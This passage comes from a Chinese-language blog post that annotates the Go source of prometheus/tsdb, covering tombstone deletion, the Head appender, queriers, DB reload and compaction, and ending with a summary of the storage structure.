title="Delete"></a>Delete</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Delete matching series between mint and maxt in the block.</span></span><br><span class="line"><span class="comment">// 前面说到, Delete 的时候会暂时先标记为 Tombstone, 这里即实现部分</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pb *Block)</span> <span class="title">Delete</span><span class="params">(mint, maxt <span class="keyword">int64</span>, ms ...labels.Matcher)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    err = pb.tombstones.Iter(<span class="function"><span class="keyword">func</span><span class="params">(id <span class="keyword">uint64</span>, ivs Intervals)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> _, iv := <span class="keyword">range</span> ivs &#123;</span><br><span class="line">            stones.add(id, iv)</span><br><span class="line">            pb.meta.Stats.NumTombstones++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    pb.tombstones = stones</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := writeTombstoneFile(pb.dir, pb.tombstones); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> writeMetaFile(pb.dir, &amp;pb.meta)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CleanTombstones</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CleanTombstones will rewrite the block if there any tombstones to remove them</span></span><br><span class="line"><span class="comment">// and returns if there was a re-write.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pb *Block)</span> <span class="title">CleanTombstones</span><span class="params">(dest <span class="keyword">string</span>, c Compactor)</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">    numStones := <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    pb.tombstones.Iter(<span class="function"><span class="keyword">func</span><span class="params">(id <span class="keyword">uint64</span>, ivs Intervals)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> _ = <span class="keyword">range</span> ivs &#123;</span><br><span class="line">            numStones++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> numStones == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _, err := c.Write(dest, pb, pb.meta.MinTime, pb.meta.MaxTime); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Snapshot"><a href="#Snapshot" class="headerlink" title="Snapshot"></a>Snapshot</h6><p>疑问, 这里仅对目标文件夹及其内部文件做了 hardlink, 怎么确保内容不变?</p><h4 id="head-go"><a href="#head-go" class="headerlink" title="head.go"></a>head.go</h4><h5 id="Head"><a href="#Head" class="headerlink" title="Head"></a>Head</h5><p>Head 向调用方提供, 用于某个时间段内的数据读写.</p><p>Head 会同时处理 WAL 内的和已经持久化的数据.</p><p>Head 可以认为是<code>current Block</code></p><p>所有 Block 不可再写入, Head 在写入有效期过后会转化为 Block 进行持久化.</p><h6 id="Appender"><a href="#Appender" class="headerlink" title="Appender"></a>Appender</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Appender returns a new Appender on the database.</span></span><br><span class="line"><span class="comment">// 会根据具体情形决定返回的 Appender 实例</span></span><br><span class="line"><span class="comment">// Appender 实例共两类</span></span><br><span class="line"><span class="comment">// initAppender 会在接收到第一个数据点时初始化 Head 的起始时间</span></span><br><span class="line"><span class="comment">// headAppender 逻辑相对简单</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Head)</span> <span class="title">Appender</span><span class="params">()</span> <span class="title">Appender</span></span> &#123;</span><br><span class="line">    h.metrics.activeAppenders.Inc()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The head cache might not have a starting point yet. The init appender</span></span><br><span class="line">    <span class="comment">// picks up the first appended timestamp as the base.</span></span><br><span class="line">    <span class="keyword">if</span> h.MinTime() == math.MinInt64 &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;initAppender&#123;head: h&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h.appender()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Head)</span> <span class="title">appender</span><span class="params">()</span> *<span class="title">headAppender</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;headAppender&#123;</span><br><span class="line">        head:          h,</span><br><span class="line">        mint:          h.MaxTime() - h.chunkRange/<span class="number">2</span>,</span><br><span class="line">        samples:       h.getAppendBuffer(),</span><br><span class="line">        highTimestamp: math.MinInt64,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="querier-go"><a href="#querier-go" class="headerlink" title="querier.go"></a>querier.go</h4><p>围绕以下三个接口, 向调用方提供查询能力.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Querier provides querying access over time series data of a fixed</span></span><br><span class="line"><span class="comment">// time range.</span></span><br><span class="line"><span class="keyword">type</span> Querier <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Select returns a set of series that matches the given label matchers.</span></span><br><span class="line">    Select(...labels.Matcher) (SeriesSet, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LabelValues returns all potential values for a label name.</span></span><br><span class="line">    LabelValues(<span class="keyword">string</span>) ([]<span class="keyword">string</span>, error)</span><br><span class="line">    <span class="comment">// LabelValuesFor returns all potential values for a label name.</span></span><br><span class="line">    <span class="comment">// under the constraint of another label.</span></span><br><span class="line">    LabelValuesFor(<span class="keyword">string</span>, labels.Label) ([]<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close releases the resources of the Querier.</span></span><br><span class="line">    Close() error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Series exposes a single time series.</span></span><br><span class="line"><span class="keyword">type</span> Series <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Labels returns the complete set of labels identifying the series.</span></span><br><span class="line">    Labels() labels.Labels</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterator returns a new iterator of the data of the series.</span></span><br><span class="line">    Iterator() SeriesIterator</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SeriesSet contains a set of series.</span></span><br><span class="line"><span class="keyword">type</span> SeriesSet <span class="keyword">interface</span> &#123;</span><br><span class="line">    Next() <span class="keyword">bool</span></span><br><span class="line">    At() Series</span><br><span class="line">    Err() error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="querier-blockQuerier"><a href="#querier-blockQuerier" class="headerlink" title="querier, blockQuerier"></a>querier, blockQuerier</h5><p>blockQuerier 是针对一个 block 的 Querier</p><p>querier 是 blockQuerier 的聚合</p><h4 id="db-go"><a href="#db-go" class="headerlink" title="db.go"></a>db.go</h4><h5 id="Appender-1"><a href="#Appender-1" class="headerlink" title="Appender"></a>Appender</h5><p>Appender 是写入接口, *Head 就实现了 Appender</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Appender allows appending a batch of data. It must be completed with a</span></span><br><span class="line"><span class="comment">// call to Commit or Rollback and must not be reused afterwards.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Operations on the Appender interface are not goroutine-safe.</span></span><br><span class="line"><span class="keyword">type</span> Appender <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Add adds a sample pair for the given series. A reference number is</span></span><br><span class="line">    <span class="comment">// returned which can be used to add further samples in the same or later</span></span><br><span class="line">    <span class="comment">// transactions.</span></span><br><span class="line">    <span class="comment">// Returned reference numbers are ephemeral and may be rejected in calls</span></span><br><span class="line">    <span class="comment">// to AddFast() at any point. Adding the sample via Add() returns a new</span></span><br><span class="line">    <span class="comment">// reference number.</span></span><br><span class="line">    <span class="comment">// If the reference is the empty string it must not be used for caching.</span></span><br><span class="line">    Add(l labels.Labels, t <span class="keyword">int64</span>, v <span class="keyword">float64</span>) (<span class="keyword">uint64</span>, error)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add adds a sample pair for the referenced series. It is generally faster</span></span><br><span class="line">    <span class="comment">// than adding a sample by providing its full label set.</span></span><br><span class="line">    AddFast(ref <span class="keyword">uint64</span>, t <span class="keyword">int64</span>, v <span class="keyword">float64</span>) error</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Commit submits the collected samples and purges the batch.</span></span><br><span class="line">    Commit() error</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Rollback rolls back all modifications made in the appender so far.</span></span><br><span class="line">    Rollback() error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h5><p>DB 是向调用者提供的最主要的结构体.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DB handles reads and writes of time series falling into</span></span><br><span class="line"><span class="comment">// a hashed partition of a seriedb.</span></span><br><span class="line"><span class="keyword">type</span> DB <span class="keyword">struct</span> &#123;</span><br><span class="line">    dir   <span class="keyword">string</span></span><br><span class="line">    lockf *lockfile.Lockfile</span><br><span class="line"></span><br><span class="line">    logger    log.Logger</span><br><span class="line">    metrics   *dbMetrics</span><br><span class="line">    opts      *Options</span><br><span class="line">    chunkPool chunkenc.Pool</span><br><span class="line">    compactor Compactor</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mutex for that must be held when modifying the general block layout.</span></span><br><span class="line">    mtx    sync.RWMutex</span><br><span class="line">    blocks []*Block</span><br><span class="line"></span><br><span class="line">    head *Head</span><br><span class="line"></span><br><span class="line">    compactc <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    donec    <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    stopc    <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cmtx is used to control compactions and deletions.</span></span><br><span class="line">    cmtx               sync.Mutex</span><br><span class="line">    compactionsEnabled <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>reload</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reload on-disk blocks and trigger head truncation if new blocks appeared. It takes</span></span><br><span class="line"><span class="comment">// a list of block directories which should be deleted during reload.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *DB)</span> <span class="title">reload</span><span class="params">(deleteable ...<span class="keyword">string</span>)</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取当前所有的 block 目录</span></span><br><span class="line">    dirs, err := blockDirs(db.dir)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        blocks []*Block</span><br><span class="line">        exist  = <span class="keyword">map</span>[ulid.ULID]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, dir := <span class="keyword">range</span> dirs &#123;</span><br><span class="line">        meta, err := readMetaFile(dir)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取目录对应的 Block, 先从内存, 再从硬盘</span></span><br><span class="line">        b, ok := db.getBlock(meta.ULID)</span><br><span class="line">        <span class="keyword">if</span> !ok &#123;</span><br><span class="line">            b, err = OpenBlock(dir, db.chunkPool)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        blocks = <span class="built_in">append</span>(blocks, b)</span><br><span class="line">        exist[meta.ULID] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按照 Block 覆盖的时间重新排序</span></span><br><span class="line">    <span class="keyword">if</span> err := validateBlockSequence(blocks); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.Wrap(err, <span class="string">"invalid block sequence"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 清除不必要的 Block 文件</span></span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> oldBlocks &#123;</span><br><span class="line">        <span class="keyword">if</span> _, ok := exist[b.Meta().ULID]; ok &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := b.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            level.Warn(db.logger).Log(<span class="string">"msg"</span>, <span class="string">"closing block failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := os.RemoveAll(b.Dir()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            level.Warn(db.logger).Log(<span class="string">"msg"</span>, <span class="string">"deleting block failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Garbage collect data in the head if the most recent persisted block</span></span><br><span class="line">    <span class="comment">// covers data of its current time range.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(blocks) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    maxt := blocks[<span class="built_in">len</span>(blocks)<span class="number">-1</span>].Meta().MaxTime</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(db.head.Truncate(maxt), <span class="string">"head truncate failed"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="run-1"><a href="#run-1" class="headerlink" title="run"></a>run</h6><p>run 方法在 Open 时被调用, 在一个单独的 goroutine 中执行, 主要是定期对数据进行压缩以节省空间</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *DB)</span> <span class="title">run</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="built_in">close</span>(db.donec)</span><br><span class="line"></span><br><span class="line">    backoff := time.Duration(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-db.stopc:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(backoff):</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Minute):</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> db.compactc &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> &lt;-db.compactc:</span><br><span class="line">            <span class="comment">// 执行压缩相关代码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> &lt;-db.stopc:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Appender-2"><a href="#Appender-2" class="headerlink" title="Appender"></a>Appender</h6><p>返回的是封装的结果 dbAppender, 后面专门再分析</p><h6 id="Qurier"><a href="#Qurier" class="headerlink" title="Qurier"></a>Qurier</h6><p>返回的是所有指定时间范围内的 Block 聚合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Querier returns a new querier over the data partition for the given time range.</span></span><br><span class="line"><span class="comment">// A goroutine must not handle more than one open Querier.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *DB)</span> <span class="title">Querier</span><span class="params">(mint, maxt <span class="keyword">int64</span>)</span> <span class="params">(Querier, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> blocks []BlockReader</span><br><span class="line"></span><br><span class="line">    db.mtx.RLock()</span><br><span class="line">    <span class="keyword">defer</span> db.mtx.RUnlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> db.blocks &#123;</span><br><span class="line">        m := b.Meta()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找出符合时间段的 block</span></span><br><span class="line">        <span class="keyword">if</span> intervalOverlap(mint, maxt, m.MinTime, m.MaxTime) &#123;</span><br><span class="line">            blocks = <span class="built_in">append</span>(blocks, b)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 前面提到, Head 可以视作当前 Block</span></span><br><span class="line">    <span class="keyword">if</span> maxt &gt;= db.head.MinTime() &#123;</span><br><span class="line">        blocks = <span class="built_in">append</span>(blocks, db.head)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block 的聚合</span></span><br><span class="line">    sq := &amp;querier&#123;</span><br><span class="line">        blocks: <span class="built_in">make</span>([]Querier, <span class="number">0</span>, <span class="built_in">len</span>(blocks)),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> blocks &#123;</span><br><span class="line">        q, err := NewBlockQuerier(b, mint, maxt)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            sq.blocks = <span class="built_in">append</span>(sq.blocks, q)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If we fail, all previously opened queriers must be closed.</span></span><br><span class="line">        <span class="keyword">for</span> _, q := <span class="keyword">range</span> sq.blocks &#123;</span><br><span class="line">            q.Close()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">"open querier for block %s"</span>, b)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sq, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Delete-1"><a href="#Delete-1" class="headerlink" title="Delete"></a>Delete</h6><p>这边实际会将 Delete 操作分给各个受影响的 Block</p><h6 id="CleanTombstone"><a href="#CleanTombstone" class="headerlink" title="CleanTombstone"></a>CleanTombstone</h6><p>前面提到, 各个 Block Delete 内的逻辑实际是写 WAL 以及 Tombstone 文件</p><p>这里会对当前所有 Block 真正进行清理, 然后调用 <code>reload</code> 方法.</p><h5 id="dbAppender"><a href="#dbAppender" class="headerlink" title="dbAppender"></a>dbAppender</h5><p>是对 *headAppender 的封装, 在 Commit 的时候触发 compact</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Appender opens a new appender against the database.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(db *DB)</span> <span class="title">Appender</span><span class="params">()</span> <span class="title">Appender</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dbAppender&#123;db: db, Appender: db.head.Appender()&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dbAppender wraps the DB's head appender and triggers compactions on commit</span></span><br><span class="line"><span class="comment">// if necessary.</span></span><br><span class="line"><span class="keyword">type</span> dbAppender <span class="keyword">struct</span> &#123;</span><br><span class="line">    Appender</span><br><span class="line">    db *DB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a dbAppender)</span> <span class="title">Commit</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    err := a.Appender.Commit()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We could just run this check every few minutes practically. But for benchmarks</span></span><br><span class="line">    <span class="comment">// and high frequency use cases this is the safer way.</span></span><br><span class="line">    <span class="keyword">if</span> a.db.head.MaxTime()-a.db.head.MinTime() &gt; a.db.head.chunkRange/<span class="number">2</span>*<span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> a.db.compactc &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p><code>prometheus/tsdb</code>  (下称 ptsdb ) 的结构体之间的层次大概可以这样划分:</p><ul><li><p>DB: 对外提供的核心对象</p><ul><li>Block 已经持久化的, 覆盖某个时间段的时序数据. Block 的 <ul><li>Index: 用于保存 labels 的索引数据</li><li>Chunk: 用于保存时间戳-采样值 数据</li></ul></li></ul></li><li><p>Head: 由于 ptsdb 规定, 数据必须增序写入, 已经持久化的 Block 不能再写入, 因此一个时刻只会有一个可供写入的 Block, 即 Head. Head 同时还承担记录删除动作的任务 </p><ul><li>WAL 增删改的动作都会先进入 WAL, 供后续恢复用</li><li>Tombstone: 用于标记删除动作, 被标记的数据在 compact 的时候统一清理</li></ul></li><li><p>Compactor: 对文件进行压缩. Block 数据的组织参考了 LSM, 因此 Compactor 的实现也和基于 LSM 的 kv db 类似.</p></li></ul><p>关于 ptsdb, <a href="https://link.jianshu.com?t=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F32900004" target="_blank" 